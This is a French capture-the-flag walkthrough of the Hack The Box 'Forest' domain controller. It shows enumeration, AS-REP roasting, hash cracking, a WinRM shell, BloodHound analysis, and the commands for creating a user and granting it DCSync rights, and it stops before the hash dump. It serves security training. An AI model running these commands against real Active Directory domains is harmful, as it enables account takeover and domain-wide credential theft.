## Description
Forest est un controlleur de domaine(DC) Windows au facile dans lequel exchange serveur a ete installe. Le contrôleur de domaine autorise les liaisons LDAP anonymes, qui sont utilisées pour énumérer les objets du domaine. Le mot de passe d'un compte de service dont la préauthentification Kerberos est désactivée peut être craqué pour avoir l'acces initial sur la machine. Le compte de service est membre du groupe Account Operators, qui peut être utilisé pour ajouter des utilisateurs à des groupes Exchange privilégiés. L'appartenance au groupe Exchange est utilisée pour obtenir les privilèges DCSync sur le domaine et vidanger les hachages NTLM.

## Recon
Pour la reconnaissance je vais utiliser mon outil d'automatisation nmap pour scanner mon target
```
└─# /home/blo/tools/nmapautomate/nmapauto.sh 10.129.4.45

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 18:36 CST
Initiating Ping Scan at 18:36
Scanning 10.129.4.45 [4 ports]
Completed Ping Scan at 18:36, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:36
Completed Parallel DNS resolution of 1 host. at 18:36, 0.07s elapsed
Initiating SYN Stealth Scan at 18:36
Scanning 10.129.4.45 [1000 ports]
Discovered open port 135/tcp on 10.129.4.45
Discovered open port 53/tcp on 10.129.4.45
Discovered open port 139/tcp on 10.129.4.45
Discovered open port 445/tcp on 10.129.4.45
Discovered open port 593/tcp on 10.129.4.45
Completed SYN Stealth Scan at 18:36, 41.90s elapsed (1000 total ports)
Nmap scan report for 10.129.4.45
Host is up (1.6s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 42.41 seconds
           Raw packets sent: 1252 (55.064KB) | Rcvd: 1158 (46.388KB)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,88,135,139,389,445,464,593,636,3268,3269
------------------------------------------------------------------------
Host is up (7.5s latency).
Not shown: 65082 filtered tcp ports (no-response), 449 closed tcp ports (reset)
PORT    STATE SERVICE    VERSION
53/tcp  open  tcpwrapped
135/tcp open  tcpwrapped
139/tcp open  tcpwrapped
445/tcp open  tcpwrapped

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.97 seconds
           Raw packets sent: 131133 (5.770MB) | Rcvd: 2788 (111.568KB)


----------------------------------------------------------------------------------------------------------
Open Ports : 53,135,139,445
----------------------------------------------------------------------------------------------------------

```
Ok maintenant mon second scan sera de toujours faire un scann sur ces ports qui sont ouverts

```
└─# nmap -sV -sC -Pn -p53,88,135,139,389,445,464,593,636,3268,3269 10.129.4.45
Nmap scan report for 10.129.4.45
Host is up (1.7s latency).

PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-02-24 00:47:55Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds      Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m50s, deviation: 4h37m11s, median: 6m48s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-02-24T00:48:38
|_  start_date: 2024-02-24T00:24:42
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-02-23T16:48:38-08:00
```

Je suis dans un active directory, comme l'indique le ldap `389`
- domain : htb.local
- DC : FOREST.htb.local
```
└─# echo "$ip  $host $host2" | tee -a /etc/hosts
10.129.4.45  htb.local FOREST.htb.local
```
**SMB**
Avec ces informations comme les ports `smb` sont ouvert je vais alors devoir commencer a checker par celles-ci pour trouver d'eventuelles chose
```
└─# crackmapexec smb $ip -u '' -p '' --shares
SMB         10.129.4.45     445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.4.45     445    FOREST           [+] htb.local\:
SMB         10.129.4.45     445    FOREST           [-] Error enumerating shares: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```
En utilisant `crackmapexec`,  je vois que l'acces anonyme est autorisee mais au faite acceder au shares sont pas possible.
- Alors je vais devoir chercher plusieurs opportunities avec cet utilisateur anonyme que j'ai

**MSRPC(135)**
Dans la reconnaissance, le port 135 etait ouvert, alors je vais utiliser `rpcclient` pour voir si je vais enumerer quelque chose d'importants avec le user anonymous
- https://www.hackingarticles.in/active-directory-enumeration-rpcclient/

```terminal
─# rpcclient -U '' -N 10.129.4.45
rpcclient $>
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $>
sebastien
lucinda
svc-alfresco
andy
mark
santi
Guest
krbtgt
Administrator
```
Wow on a des utilisateurs, ok maintenant avec ces utilisateurs quoi faire ?
- Je pourrais les mettre dans une listes et ensuite d'essayer ces utilisateurs comme username and password
- Aussi je vais voir si c'est users sont dans les kerberoas
```
# kerbrute userenum --dc 10.129.4.45 -d htb.local users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 02/23/24 - Ronnie Flathers @ropnop

2024/02/23 19:07:01 >  Using KDC(s):
2024/02/23 19:07:01 >  	10.129.4.45:88

2024/02/23 19:07:03 >  [+] VALID USERNAME:	 lucinda@htb.local
2024/02/23 19:07:03 >  [+] VALID USERNAME:	 Administrator@htb.local
2024/02/23 19:07:03 >  [+] VALID USERNAME:	 mark@htb.local
2024/02/23 19:07:03 >  [+] VALID USERNAME:	 santi@htb.local
2024/02/23 19:07:03 >  [+] VALID USERNAME:	 andy@htb.local
2024/02/23 19:07:03 >  [+] VALID USERNAME:	 sebastien@htb.local
2024/02/23 19:07:03 >  [+] VALID USERNAME:	 svc-alfresco@htb.local
2024/02/23 19:07:03 >  Done! Tested 9 usernames (7 valid) in 1.762 seconds
```
Avec kerbrute on me dit que seul 7 utilisateurs sont valide et on de compte kerberoas, alors j'enleve les autres.
Maintenant je vais utiliser `crackmapexec` ou `netexec` pour voir si un de ces users n'a pas son username comme etant aussi son mot de passe

```
└─# nxc smb 10.129.4.45 -u users.txt -p users.txt --no-bruteforce --continue-on-success
SMB         10.129.4.45     445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.4.45     445    FOREST           [-] htb.local\sebastien:sebastien STATUS_LOGON_FAILURE
SMB         10.129.4.45     445    FOREST           [-] htb.local\lucinda:lucinda STATUS_LOGON_FAILURE
SMB         10.129.4.45     445    FOREST           [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.4.45     445    FOREST           [-] htb.local\andy:andy STATUS_LOGON_FAILURE
SMB         10.129.4.45     445    FOREST           [-] htb.local\mark:mark STATUS_LOGON_FAILURE
SMB         10.129.4.45     445    FOREST           [-] htb.local\santi:santi STATUS_LOGON_FAILURE
SMB         10.129.4.45     445    FOREST           [-] htb.local\Administrator:Administrator STATUS_LOGON_FAILURE
```
Ok aucun des users n'a son username comme mot de passe

**ASREPRoast Sans authentification**
L'attaque ASREPRoast recherche des utilisateurs sans préauthentification Kerberos requise. Cela signifie que n'importe qui peut envoyer une requête `AS_REQ ` au KDC au nom de l'un de ces utilisateurs et recevoir un message `AS_REP` Ce dernier type de message contient un morceau de données cryptées avec la clé originale de l'utilisateur, dérivée de son mot de passe. En utilisant ce message, le mot de passe de l'utilisateur peut être déchiffré hors ligne.
 - https://www.netexec.wiki/ldap-protocol/asreproast
 

```
└─# nxc ldap 10.129.4.45 -u users.txt -p '' --asreproast out.txt
SMB         10.129.4.45     445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
LDAP        10.129.4.45     445    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:edda6953ed4861f8cd060cc1034fb9f1$6c60d8004a9db82ba881dec8e91452bdfc3c66f749dd09a3cf6c14b9e941c5b8c22bbbc8af4f53f3a51578ebcabb27cb793f691e116e5ea82610d60c75e8a08f9f193c9f8a48b3d83c61d9535216c4b3fd2508a6bd2daf07d5acf65afee42511805056a592f537f4ccbc163d4f0e11b7aa3d82bcfde71f36dbfdb0a8cb8a327fcb9fc6b9f425f48d296fca748fc2f508aaaec61c8d8d867e303c85c88ccafe315ec754994a913639c9ad61a4accc011eba1b103f066314367090d4f8fcd24516faa5b733600dea61beb789aa9cbdb6ba1ce49ac865dc059e195be6dbb51a1668f20ccb954959
```
Oubien on peux aussi le faire avec l'outil `Get-NPUsers` sans password de impacket
```
└─# impacket-GetNPUsers htb.local/ -usersfile user
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:d81ff7d3a5c6851f4b3ef13e35292a99$e536998eba85fc12776e69b5b4f1615064efb6e148446dc598478cde93ab7d9a786fcd04cf365d86dbf29c6ea93edddc4e818dc2432893b3e45ab594ad944a2da2fba02928379164366f85d28bd6b7a798227b1338d248b06bde21c3804f706fe46ade5cd6ba4e6eb6da514bc16571a04473324ccd5e9d85b066f9adea291bc3e408f69e302ea465daefcca4ab4820ac36328aa467655a05b8ed2f0d14e29a541f903b0e237a52e022bd7642b99a5e07bc0ff07b637aba1df20511c920993c1861963380030543447941d59b40a1acce563e08847e28c42d9c07e95d82939a0b8bf3983f884a
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

```
Maintenant avec ce message je vais la dechiffrer avec hashcat
```
└─# hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
$krb5asrep$23$svc-alfresco@HTB.LOCAL:edda6953ed4861f8cd060cc1034fb9f1$6c60d8004a9db82ba881dec8e91452bdfc3c66f749dd09a3cf6c14b9e941c5b8c22bbbc8af4f53f3a51578ebcabb27cb793f691e116e5ea82610d60c75e8a08f9f193c9f8a48b3d83c61d9535216c4b3fd2508a6bd2daf07d5acf65afee42511805056a592f537f4ccbc163d4f0e11b7aa3d82bcfde71f36dbfdb0a8cb8a327fcb9fc6b9f425f48d296fca748fc2f508aaaec61c8d8d867e303c85c88ccafe315ec754994a913639c9ad61a4accc011eba1b103f066314367090d4f8fcd24516faa5b733600dea61beb789aa9cbdb6ba1ce49ac865dc059e195be6dbb51a1668f20ccb954959:s3rvice

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:edda6953ed4861...954959
Time.Started.....: Fri Feb 23 19:20:58 2024 (1 sec)
Time.Estimated...: Fri Feb 23 19:20:59 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2367.6 kH/s (1.27ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4087808/14344387 (28.50%)
Rejected.........: 0/4087808 (0.00%)
Restore.Point....: 4083712/14344387 (28.47%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: s523513859 -> s27041994
Hardware.Mon.#1..: Temp: 41c Util: 55%

Started: Fri Feb 23 19:20:57 2024
Stopped: Fri Feb 23 19:21:00 2024

```

Voila maintenant qu'on a un user et un mot de passe, alors quoi faire ?

Ouvert Ok, je vais alors essayer de me connecter sur cette machine avec cet utilisateur avec `wmiexec` ou `psexec`
```
└─# impacket-wmiexec htb.local/svc-alfresco:s3rvice@10.129.4.45
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
```

```
└─# impacket-psexec htb.local/svc-alfresco:s3rvice@10.129.4.45
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] Requesting shares on 10.129.4.45.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.

```
Avec ces outils ca ne mache pas. Alors je vais voir le winrm
```
└─# nc -nv 10.129.4.45 5985
(UNKNOWN) [10.129.4.45] 5985 (?) open
```

```
└─# evil-winrm -i 10.129.4.45 -u svc-alfresco -p s3rvice

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/23/2024   4:25 PM             34 user.txt


type us*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
d2db9c31a75f19c98fd0cf5cae746784
```

## Escalation to Domain Admin
Pour commencer la recherche des choses qui vont nous aider a escalader nos privilege, je vais enumerer l'utilisateur dans lequel nous y somme

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user svc-alfresco
User name                    svc-alfresco
Full Name                    svc-alfresco
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2024 6:09:41 PM
Password expires             Never
Password changeable          2/24/2024 6:09:41 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/23/2024 5:32:20 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Service Accounts
The command completed successfully.

```
grace au Global Group memberships, on vois que l'utilisateur est un membre du groupe des `services accounts`. Maintenant avec ca utilisons l'outil `bloodhound` pour voir si on pourrais avoir des path exploitables
- BloodHound est programmé pour générer des graphiques qui révèlent les relations cachées au sein d'un réseau Active Directory. BloodHound est également compatible avec Azure. BloodHound permet aux attaquants d'identifier des chemins d'attaque complexes qu'il serait autrement impossible d'identifier. L'équipe bleue peut utiliser BloodHound pour identifier et corriger ces mêmes schémas d'attaque.

Pour ce faire je vais utiliser `bloodhound-python` je vais extraire toutes les informations sur ma machine cible pour ensuite les analyser avec bloodhound

```
└─# bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -ns 10.129.4.45 -c All
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
WARNING: Failed to get service ticket for FOREST.htb.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 05M 13S
```
Je viens d'avoir plusieurs fichier en `.json`, maintenant utilisons `bloodhound` pour analyser le tout
- Pour le faire je vais juste importer mes fichiers json dans le `bloodhound`
- J'utilise le find shortest path to Domains Admins et je trouve le user `svc-alfresco` qui es membre de `service accounts` groupes, et ce groupe aussi est membre du `Privileged IT Accounts`, qui elle aussi peux `PsRemote` au domain `FOREST.htb.local`, ensuite celle-ci peux `DCSync` au domain `htb.local` qui contient tous les users

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
**DCSync & CanPsRemote Attack**
Comme mon utilisateur fait partie du Compte de service, qui est membre du Compte informatique privilégié, qui est membre des Opérateurs de compte, c'est en fait comme si mon utilisateur était membre des Opérateurs de compte. Et les opérateurs de compte ont le privilège Tout générique sur le groupe Permissions Windows Exchange. 

En rassemblant tout on obtient ceci:
Je peux:
Abuser les infos grace au `CanPsremote` pour creer un utilisateur et  garantir les privileges *DCSync*
Créer un utilisateur sur le domaine. Cela est possible car `svc-alfresco` est membre du groupe services de compte.
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user bloman Password1 /add /domain
The command completed successfully.
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
$331000-VK4ADACQNUCA     Administrator            andy
bloman                   DefaultAccount           Guest
HealthMailbox0659cc1     HealthMailbox670628e     HealthMailbox6ded678
HealthMailbox7108a4e     HealthMailbox83d6781     HealthMailbox968e74d
HealthMailboxb01ac64     HealthMailboxc0a90c9     HealthMailboxc3d7722
HealthMailboxfc9daad     HealthMailboxfd87238     krbtgt
lucinda                  mark                     santi
sebastien                SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb     SM_681f53d4942840e18     SM_75a538d3025e4db9a
SM_7c96b981967141ebb     SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b     svc-alfresco
```
Donner à l'utilisateur les privilèges DcSync. Ceci est possible car l'utilisateur fait partie du groupe Exchange Windows Permissions qui a la permission WriteDacl sur le domaine htb.local.
Effectuer une attaque DcSync et extraire les hachages de mots de passe de tous les utilisateurs du domaine.
Effectuez une attaque Pass the Hash pour obtenir l'accès au compte de l'administrateur.

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" bloman /add /domain
The command completed successfully.
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user bloman
User name                    bloman
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2024 7:30:26 PM
Password expires             Never
Password changeable          2/24/2024 7:30:26 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
```
Il es bien maintenant dans le groupe qu'on lui a mis
Maintenant je vais faire une attaque `DCSync`
 - https://support.bloodhoundenterprise.io/hc/en-us/articles/17322220586779-CanPSRemote
```
$pass = convertto-securestring 'Password1' -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential('htb\bloman', $pass) 
Add-DomainGroupMember -Identity 'Backup_Admins' -Members bloman -Credential $cred

Get-DomainGroup -MemberIdentity bloman | select samaccountname
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity bloman -Rights DCSync
```



Oubien aussi y'a un outil qui peux automatiser cela
- https://github.com/fox-it/aclpwn.py